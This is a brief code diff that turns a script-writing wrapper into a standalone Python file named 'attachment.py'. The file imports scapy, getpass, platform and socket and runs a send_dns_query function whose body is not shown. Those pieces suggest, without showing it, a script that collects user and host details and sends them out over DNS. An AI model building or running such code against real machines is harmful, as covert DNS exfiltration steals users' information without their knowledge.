@@ -1,7 +1,4 @@
-if __name__ == "__main__":
-
-    with open("attachment.py" , "w") as f:
-        f.write("""from scapy.all import *
+from scapy.all import *
 import platform 
 import getpass
 import socket
@@ -64,5 +61,3 @@ def send_dns_query():
 
 if __name__ == '__main__':
     send_dns_query()
-""")
-
